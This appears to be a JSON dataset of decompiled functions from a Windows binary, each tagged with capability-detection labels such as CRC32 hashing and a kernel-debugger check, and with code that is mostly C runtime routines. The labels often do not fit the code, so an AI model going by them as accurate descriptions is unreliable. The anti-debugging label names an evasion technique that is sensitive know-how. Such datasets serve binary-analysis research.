{
    "004601be": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004601be(uint32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    fcn.00401f50();\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX + -8);\n    }\n    return in_ECX + -8;\n}\n",
        "token_count": 82
    },
    "0040100f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040100f(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar4;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar5;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar5 = param_1[10];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[10] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar5 = 0,  *(param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1;\n        iVar5 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404bb5(iVar5 + 0x15d);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.00405911();\n        param_1[10] = iVar5 + -0x15d;\n    }\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar3;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.00405911();\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    iVar5 = *(param_1 + 0x31);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.004030f8();\n    arg_10h = fcn.00405911();\n    fcn.00404156(&var_8h, puVar3, arg_10h, arg_14h, arg_18h, iVar5, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.0040229d(param_1[0xd], param_1[2]);\n    }\n    if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        fcn.00405b23(param_1[0xd], param_1[2]);\n    }\n    pcVar4 = param_1[0xd];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xd] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        *(param_1 + 0x31) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xe] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1079
    },
    "004010e1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004010e1(uint8_t *arg_8h, uint8_t *arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint uVar6;\n    bool bVar7;\n    \n    iVar2 = *(arg_8h + 4);\n    if (((iVar2 == 0) || (puVar5 = iVar2 + 8,  *puVar5 == 0)) || (((*arg_8h & 0x80) != 0 && ((*arg_ch & 0x10) != 0)))) {\n        uVar6 = 1;\n    }\n    else {\n        uVar6 = 0;\n        if (iVar2 != *(arg_ch + 4)) {\n            puVar3 = *(arg_ch + 4) + 8;\n            do {\n                uVar1 = *puVar5;\n                bVar7 = uVar1 < *puVar3;\n                if (uVar1 != *puVar3) {\ncode_r0x004884a3:\n                    uVar4 = -bVar7 | 1;\n                    goto code_r0x004884a8;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = puVar5[1];\n                bVar7 = uVar1 < puVar3[1];\n                if (uVar1 != puVar3[1]) goto code_r0x004884a3;\n                puVar5 = puVar5 + 2;\n                puVar3 = puVar3 + 2;\n            } while (uVar1 != 0);\n            uVar4 = 0;\ncode_r0x004884a8:\n            if (uVar4 != 0) {\n                return 0;\n            }\n        }\n        if ((((*arg_ch & 2) == 0) || ((*arg_8h & 8) != 0)) &&\n           ((((*arg_10h & 1) == 0 || ((*arg_8h & 1) != 0)) && (((*arg_10h & 2) == 0 || ((*arg_8h & 2) != 0)))))) {\n            uVar6 = 1;\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 530
    },
    "0047e14d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047e14d(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "004622cb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004622cb(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00405a60(in_ECX + 1);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00401375": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nchar ** __cdecl fcn.00401375(char **arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    uint var_28h;\n    uint var_20h;\n    char *var_18h;\n    char *var_14h;\n    char *var_10h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    cVar1 = **0x56f458;\n    if (cVar1 == '\\0') {\n        var_10h = \"`unknown ecsu\\'\";\n        var_ch = 0xe;\n        fcn.00402cfc(&var_10h);\n        fcn.004061ef(arg_8h, 1);\n        return arg_8h;\n    }\n    var_10h = NULL;\n    var_ch = NULL;\n    if (cVar1 == 'W') {\n        if ((~(*0x56f460 >> 0xf) & 1) != 0) {\ncode_r0x0048d265:\n            *0x56f458 = *0x56f458 + 1;\n            var_8h = NULL;\n            var_4h = NULL;\n            if (cVar1 == 'T') {\n                var_18h = \"union \";\ncode_r0x0048d31f:\n                var_14h = 0x6;\ncode_r0x0048d326:\n                fcn.004022a2(&var_18h);\n            }\n            else {\n                if (cVar1 == 'U') {\n                    var_18h = \"struct \";\n                    var_14h = 0x7;\n                    goto code_r0x0048d326;\n                }\n                if (cVar1 == 'V') {\n                    var_18h = \"class \";\n                    goto code_r0x0048d31f;\n                }\n                if (cVar1 != 'W') {\n                    if (cVar1 == 'X') {\n                        var_18h = \"coclass \";\n                        var_14h = 0x8;\n                    }\n                    else {\n                        if (cVar1 != 'Y') goto code_r0x0048d332;\n                        var_18h = \"cointerface \";\n                        var_14h = 0xc;\n                    }\n                    goto code_r0x0048d326;\n                }\n                var_18h = \"enum \";\n                var_14h = 0x5;\n                arg_ch = fcn.0040285b(&var_20h);\n                fcn.00402cfc(&var_18h);\n                fcn.004052f9(&var_18h, arg_ch);\n                var_8h = var_18h;\n                var_4h = var_14h;\n            }\ncode_r0x0048d332:\n            var_10h = var_8h;\n            var_ch = var_4h;\n            goto code_r0x0048d224;\n        }\n    }\n    else if (((~(*0x56f460 >> 0xf) & 1) != 0) && ((*0x56f460 & 0x1000) == 0)) goto code_r0x0048d265;\n    *0x56f458 = *0x56f458 + 1;\n    if (cVar1 == 'W') {\n        fcn.0040285b(&var_28h);\n    }\ncode_r0x0048d224:\n    fcn.004063b6(&var_18h);\n    fcn.00402eb9(&var_18h);\n    *arg_8h = var_10h;\n    arg_8h[1] = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 818
    },
    "004013b1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004013b1(uint32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    \n    fcn.00405f06(arg_ch);\n    if ((arg_ch[3] & 6) == 0) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 9;\n    }\n    else {\n        if ((arg_ch[3] >> 0xc & 1) == 0) {\n            if ((arg_ch[3] & 1) != 0) {\n                cVar1 = fcn.004d0de2(arg_ch);\n                arg_ch[2] = 0;\n                if (cVar1 == '\\0') goto code_r0x004d09ac;\n                *arg_ch = arg_ch[1];\n                LOCK();\n                arg_ch[3] = arg_ch[3] & 0xfffffffe;\n            }\n            LOCK();\n            arg_ch[3] = arg_ch[3] | 2;\n            LOCK();\n            arg_ch[3] = arg_ch[3] & 0xfffffff7;\n            arg_ch[2] = 0;\n            if (((arg_ch[3] & 0x4c0) == 0) && (cVar1 = fcn.004052ae(arg_ch),  cVar1 == '\\0')) {\n                fcn.00401faf(arg_ch);\n            }\n            cVar1 = fcn.004d0be2(arg_8h, arg_ch);\n            if (cVar1 == '\\0') {\n                LOCK();\n                arg_ch[3] = arg_ch[3] | 0x10;\n                arg_8h = 0xffffffff;\n            }\n            else {\n                arg_8h = arg_8h & 0xff;\n            }\n            return arg_8h;\n        }\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x22;\n    }\ncode_r0x004d09ac:\n    LOCK();\n    arg_ch[3] = arg_ch[3] | 0x10;\n    return 0xffffffff;\n}\n",
        "token_count": 477
    },
    "004013d4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar ** __cdecl fcn.004013d4(char **arg_8h, char **arg_ch, int32_t arg_10h, char **arg_14h, int32_t arg_18h)\n\n{\n    char cVar1;\n    int32_t arg_14h_00;\n    char *pcVar2;\n    char **ppcVar3;\n    uint *arg_8h_00;\n    uint uVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    ulong uVar7;\n    uint var_80h;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    char *var_48h;\n    char *var_44h;\n    char *var_40h;\n    char *var_3ch;\n    char *var_38h;\n    char *var_34h;\n    char *var_30h;\n    char *var_2ch;\n    uint var_28h;\n    char var_1eh;\n    char *var_1dh;\n    char *var_18h;\n    char *var_11h;\n    char *var_ch;\n    char *var_8h;\n    char *var_4h;\n    \n    arg_14h_00 = arg_18h;\n    ppcVar3 = arg_14h;\n    var_11h._0_1_ = '\\0';\n    if (**0x56f458 == '\\0') {\n        if (arg_18h == 0) {\n            if (*arg_ch == NULL) {\n                arg_ch = arg_14h;\n                if (*arg_14h == NULL) goto code_r0x0048c9d5;\n            }\n            else if (((arg_ch[1] & 0x100) == 0) && (*arg_14h != NULL)) {\n                fcn.004017df(1);\n                fcn.004052f9(&var_48h, ppcVar3);\n                fcn.004032bf(&var_50h, 0x20);\n                fcn.004052f9(arg_8h, arg_ch);\n                return arg_8h;\n            }\n            fcn.004012ad(arg_8h, 1, arg_ch);\n            return arg_8h;\n        }\ncode_r0x0048c9d5:\n        fcn.004017df(1);\n        return arg_8h;\n    }\n    if ((**0x56f458 != '$') || (fcn.004031b1(&var_1dh + 1, &arg_10h, &var_11h, arg_18h),  stack0xffffffe0 == NULL)) {\n        pcVar6 = NULL;\n        var_2ch = NULL;\n        var_30h = NULL;\n        var_34h = NULL;\n        var_1dh._0_1_ = '\\0';\n        var_1eh = '\\0';\n        uVar5 = **0x56f458 - (((**0x56f458 < 'A') - 1 & 0x2b) + 0x16);\n        var_38h = NULL;\n        do {\n            if (uVar5 == 4) {\n                if ((~((*0x56f460 >> 0x10 | *0x56f460) >> 1) & 1) != 0) {\n                    uVar7 = fcn.00402ce3(0xb);\n                    if (pcVar6 == NULL) {\n                        arg_8h_00 = &var_11h + 1;\ncode_r0x0048c55a:\n                        unique0x10000e4f = uVar7;\n                        fcn.004022a2(arg_8h_00);\n                        pcVar6 = var_30h;\n                    }\n                    else {\n                        var_3ch = var_2ch;\n                        var_40h = pcVar6;\n                        _var_78h = uVar7;\n                        fcn.00403cba(0x20);\n                        ppcVar3 = fcn.004050ba(&var_28h, &var_78h);\n                        pcVar6 = *ppcVar3;\n                        var_2ch = ppcVar3[1];\n                        var_30h = pcVar6;\n                    }\n                }\n            }\n            else if (uVar5 == 5) {\n                if ((~(*0x56f460 >> 1) & 1) != 0) {\n                    if (var_38h == NULL) {\n                        uVar7 = fcn.00402ce3(0xd);\n                        _var_70h = uVar7;\n                        fcn.004022a2(&var_70h);\n                    }\n                    else {\n                        uVar7 = fcn.00402ce3(0xd);\n                        var_8h = var_38h;\n                        var_4h = var_34h;\n                        _var_68h = uVar7;\n                        fcn.00403cba(0x20);\n                        ppcVar3 = fcn.004050ba(&var_50h, &var_68h);\n                        var_38h = *ppcVar3;\n                        var_34h = ppcVar3[1];\n                    }\n                }\n            }\n            else if (uVar5 == 6) {\n                if (arg_14h_00 == 0) goto code_r0x0048c751;\n                var_1dh._0_1_ = '\\x01';\n            }\n            else if (uVar5 == 7) {\n                if (arg_14h_00 == 0) goto code_r0x0048c751;\n                var_1eh = '\\x01';\n            }\n            else {\n                if (uVar5 != 8) {\n                    if (**0x56f458 != '\\0') {\n                        *0x56f458 = *0x56f458 + 1;\n                    }\n                    if (0x1f < uVar5) goto code_r0x0048c751;\n                    unique0x00007a00 = *(arg_10h * 8 + 0x54eb88);\n                    var_3ch = *(arg_10h * 8 + 0x54eb8c);\n                    var_ch = var_3ch;\n                    fcn.00402cfc(&var_11h + 1);\n                    stack0xffffffe0 = NULL;\n                    var_18h = NULL;\n                    fcn.00402eb9(&var_8h);\n                    var_8h = stack0xffffffe0;\n                    var_4h = var_18h;\n                    if (pcVar6 != NULL) {\n                        fcn.00403cba(0x20);\n                        ppcVar3 = fcn.004052f9(&var_28h, &var_30h);\n                        var_8h = *ppcVar3;\n                        var_4h = ppcVar3[1];\n                    }\n                    if (var_38h != NULL) {\n                        stack0xffffffe0 = var_38h;\n                        var_18h = var_34h;\n                        fcn.00403cba(0x20);\n                        ppcVar3 = fcn.004052f9(&var_28h, &var_8h);\n                        var_8h = *ppcVar3;\n                        var_4h = ppcVar3[1];\n                    }\n                    if ((uVar5 & 0x10) != 0) {\n                        if (arg_14h_00 != 0) goto code_r0x0048c751;\n                        if (var_3ch < 1) {\n                            if (**0x56f458 != '\\0') {\n                                uVar4 = fcn.004039f4(&var_28h);\n                                fcn.004068e3(uVar4);\n                                goto code_r0x0048c73b;\n                            }\n                        }\n                        else {\n                            stack0xffffffec = 0x54f380;\n                            var_ch = 0x2;\n                            fcn.00402cfc(&var_11h + 1);\n                            fcn.004052f9(&var_11h + 1, &var_8h);\n                            var_8h = stack0xffffffec;\n                            var_4h = var_ch;\n                            if (**0x56f458 == '\\0') {\n                                fcn.004017df(1);\n                                fcn.004052f9(&var_11h + 1, &var_8h);\n                                var_8h = stack0xffffffec;\n                                var_4h = var_ch;\n                            }\n                            else {\n                                fcn.004039f4(&var_28h);\n                                ppcVar3 = fcn.004052f9(&var_50h, &var_8h);\n                                var_8h = *ppcVar3;\n                                var_4h = ppcVar3[1];\n                            }\ncode_r0x0048c73b:\n                            cVar1 = **0x56f458;\n                            if (cVar1 != '\\0') {\n                                *0x56f458 = *0x56f458 + 1;\n                                if (cVar1 != '@') goto code_r0x0048c751;\n                                goto code_r0x0048c786;\n                            }\n                        }\n                        if (var_4h < '\\x02') {\n                            if (var_8h == NULL) {\n                                fcn.00402e8c(1);\n                            }\n                            else {\n                                fcn.0040564b(0x54fa08);\n                            }\n                        }\n                    }\ncode_r0x0048c786:\n                    if ((~(*0x56f460 >> 1) & 1) == 0) {\n                        if ((uVar5 & 0xc) == 0xc) {\n                            uVar4 = fcn.004050f6(&var_28h);\n                            fcn.004068e3(uVar4);\n                        }\n                    }\n                    else if ((uVar5 & 0xc) == 0xc) {\n                        if (arg_14h_00 != 0) {\ncode_r0x0048c751:\n                            arg_8h[1] = NULL;\n                            *arg_8h = NULL;\n                            *(arg_8h + 1) = 2;\n                            return arg_8h;\n                        }\n                        fcn.004050f6(&var_28h);\n                        ppcVar3 = fcn.004052f9(&var_50h, &var_8h);\n                        var_8h = *ppcVar3;\n                        var_4h = ppcVar3[1];\n                    }\n                    if ((uVar5 & 2) != 0) {\n                        stack0xffffffec = \"volatile \";\n                        var_ch = 0x9;\n                        fcn.00402cfc(&var_11h + 1);\n                        fcn.004052f9(&var_11h + 1, &var_8h);\n                        var_8h = stack0xffffffec;\n                        var_4h = var_ch;\n                    }\n                    if ((uVar5 & 1) != 0) {\n                        stack0xffffffec = \"const \";\n                        var_ch = 0x6;\n                        fcn.00402cfc(&var_11h + 1);\n                        fcn.004052f9(&var_11h + 1, &var_8h);\n                        var_8h = stack0xffffffec;\n                        var_4h = var_ch;\n                    }\n                    if (var_1dh != '\\0') {\n                        stack0xffffffe0 = var_8h;\n                        var_18h = var_4h;\n                        stack0xffffffec = 0x54f7ec;\n                        var_ch = 0x2;\n                        fcn.00405c95(&var_11h + 1);\n                        var_8h = stack0xffffffe0;\n                        var_4h = var_18h;\n                    }\n                    if (var_1eh != '\\0') {\n                        stack0xffffffe0 = var_8h;\n                        var_18h = var_4h;\n                        stack0xffffffec = 0x54f7f0;\n                        var_ch = 0x3;\n                        fcn.00405c95(&var_11h + 1);\n                        var_8h = stack0xffffffe0;\n                        var_4h = var_18h;\n                    }\n                    pcVar2 = var_8h;\n                    pcVar6 = var_4h;\n                    if (arg_14h_00 != 0) goto code_r0x0048c940;\n                    if (*arg_ch == NULL) {\n                        arg_ch = arg_14h;\n                        if (*arg_14h == NULL) goto code_r0x0048c940;\ncode_r0x0048c929:\n                        uVar4 = fcn.00402e87(&var_28h, 0x20, arg_ch);\n                    }\n                    else {\n                        pcVar6 = arg_ch[1];\n                        if (((pcVar6 & 0x100) != 0) || (*arg_14h == NULL)) {\n                            pcVar2 = *arg_ch;\n                            if ((pcVar6 & 0x800) != 0) goto code_r0x0048c940;\n                            goto code_r0x0048c929;\n                        }\n                        fcn.00402e87(&var_28h, 0x20, arg_14h);\n                        fcn.004032bf(&var_50h, 0x20);\n                        uVar4 = fcn.004052f9(&var_80h, arg_ch);\n                    }\n                    fcn.00402eb9(uVar4);\n                    pcVar2 = var_8h;\n                    pcVar6 = var_4h;\ncode_r0x0048c940:\n                    var_4h = pcVar6;\n                    var_8h = pcVar2;\n                    pcVar6 = var_4h | 0x100;\n                    if (var_11h != '\\0') {\n                        pcVar6 = var_4h | 0x2100;\n                    }\n                    *arg_8h = var_8h;\n                    arg_8h[1] = pcVar6;\n                    return arg_8h;\n                }\n                if ((~(*0x56f460 >> 1) & 1) != 0) {\n                    uVar7 = fcn.00402ce3(0xc);\n                    if (pcVar6 == NULL) {\n                        arg_8h_00 = &var_60h;\n                        _var_60h = uVar7;\n                        uVar7 = stack0xffffffec;\n                        goto code_r0x0048c55a;\n                    }\n                    var_18h = var_2ch;\n                    unique0x10000deb = pcVar6;\n                    _var_58h = uVar7;\n                    fcn.00403cba(0x20);\n                    ppcVar3 = fcn.004050ba(&var_80h, &var_58h);\n                    var_2ch = ppcVar3[1];\n                    pcVar6 = *ppcVar3;\n                    var_30h = *ppcVar3;\n                }\n            }\n            *0x56f458 = *0x56f458 + 1;\n            if (**0x56f458 == '$') {\n                fcn.004031b1(&var_48h, &arg_10h, &var_11h, arg_14h_00);\n                if (var_48h != NULL) goto code_r0x0048c961;\n            }\n            uVar5 = **0x56f458 - (((**0x56f458 < 'A') - 1 & 0x2b) + 0x16);\n        } while( true );\n    }\n    *arg_8h = stack0xffffffe0;\n    goto code_r0x0048c39c;\ncode_r0x0048c961:\n    *arg_8h = var_48h;\n    var_18h = var_44h;\ncode_r0x0048c39c:\n    arg_8h[1] = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 3630
    },
    "004d01bc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint64_t __cdecl fcn.004d01bc(int32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_10h;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (arg_8h == NULL) {\n        puVar2 = fcn.004039a4();\n        *puVar2 = 0x16;\n        fcn.00403751();\n        return -1;\n    }\n    arg_8h_00 = fcn.00405f06(arg_8h);\n    if (arg_8h[2] < 0) {\n        arg_8h[2] = 0;\n    }\n    iVar5 = fcn.00404552(arg_8h_00, 0, 0, 1);\n    arg_10h = iVar5 >> 0x20;\n    if ((iVar5 < 0x100000000) && (iVar5 < 0)) {\ncode_r0x004d02e7:\n        iVar7 = -1;\n    }\n    else {\n        if ((arg_8h[3] & 0xc0U) == 0) {\n            return iVar5 - arg_8h[2];\n        }\n        iVar3 = arg_8h_00 >> 6;\n        iVar4 = (arg_8h_00 & 0x3f) * 0x38;\n        uVar1 = *(iVar4 + 0x29 + *(iVar3 * 4 + 0x570220));\n        var_4h = var_4h & 0xffffff00 | uVar1;\n        iVar7 = *arg_8h - arg_8h[1];\n        if ((arg_8h[3] & 3U) == 0) {\n            if ((arg_8h[3] >> 2 & 1) == 0) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                goto code_r0x004d02e7;\n            }\n        }\n        else {\n            if ((uVar1 == 1) && ((*(iVar4 + 0x2d + *(iVar3 * 4 + 0x570220)) & 2) != 0)) {\n                iVar5 = fcn.004d069b(arg_8h, iVar5, arg_10h);\n                return iVar5;\n            }\n            if (*(iVar4 + 0x28 + *(iVar3 * 4 + 0x570220)) < '\\0') {\n                iVar6 = fcn.004d0896(arg_8h[1], *arg_8h, var_4h);\n                iVar7 = iVar6 + iVar7;\n            }\n        }\n        if (iVar5 != 0) {\n            if ((arg_8h[3] & 1U) == 0) {\n                if (uVar1 == 1) {\n                    iVar7 = fcn.0040604b(iVar7, 2, 0);\n                }\n                iVar7 = iVar7 + iVar5;\n            }\n            else {\n                iVar7 = fcn.004d0474(arg_8h, iVar5, arg_10h, iVar7, iVar7 >> 0x20);\n            }\n        }\n    }\n    return iVar7;\n}\n",
        "token_count": 806
    },
    "004014d3": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004014d3(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar5;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar6;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404f9d();\n    if (cVar2 == '\\0') {\ncode_r0x004a1153:\n        uVar4 = 0;\n    }\n    else {\n        cVar2 = fcn.00406528();\n        if (cVar2 != '\\0') {\n            iVar6 = param_1[10];\n            if (iVar6 < 0) {\n                if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n                    iVar6 = 0xd;\n                }\n                else {\n                    iVar6 = 6;\n                }\n                param_1[10] = iVar6;\n            }\n            else if ((iVar6 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar6 = 0,  *(param_1 + 0x31) == 'G')))) {\n                param_1[10] = 1;\n                iVar6 = 1;\n            }\n            cVar2 = fcn.00404bb5(iVar6 + 0x15d);\n            if (cVar2 == '\\0') {\n                iVar6 = fcn.00405911();\n                param_1[10] = iVar6 + -0x15d;\n            }\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            var_8h = NULL;\n            var_4h = NULL;\n            param_1[0xd] = puVar3;\n            cVar2 = fcn.00401550(&var_8h);\n            if (cVar2 == '\\0') goto code_r0x004a1153;\n            uVar4 = fcn.00405911();\n            puVar3 = param_1[0x111];\n            if (param_1[0x111] == NULL) {\n                puVar3 = param_1 + 0x10;\n            }\n            iVar6 = *(param_1 + 0x31);\n            arg_30h = 1;\n            arg_2ch = param_1[2];\n            noname_8 = param_1[1];\n            arg_24h = *param_1;\n            arg_20h = param_1[10];\n            arg_14h = fcn.004030f8();\n            arg_10h = fcn.00405911();\n            fcn.00404156(&var_8h, puVar3, arg_10h, arg_14h, uVar4, iVar6, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n            if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n                fcn.0040229d(param_1[0xd], param_1[2]);\n            }\n            if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n                fcn.00405b23(param_1[0xd], param_1[2]);\n            }\n            pcVar5 = param_1[0xd];\n            cVar2 = *pcVar5;\n            if (cVar2 == '-') {\n                param_1[8] = param_1[8] | 0x40;\n                pcVar5 = pcVar5 + 1;\n                param_1[0xd] = pcVar5;\n                cVar2 = *pcVar5;\n            }\n            if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n                param_1[8] = param_1[8] & 0xfffffff7;\n                *(param_1 + 0x31) = 0x73;\n            }\n            pcVar1 = pcVar5 + 1;\n            do {\n                cVar2 = *pcVar5;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            param_1[0xe] = pcVar5 - pcVar1;\n        }\n        uVar4 = 1;\n    }\n    return uVar4;\n}\n",
        "token_count": 1160
    },
    "0046b95e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b95e(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Mpunct_wchar_t_.0;\n    fcn.00405e1b();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00401587": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401587(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402739(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00403751();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a41e5;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a41e5;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a41e5:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 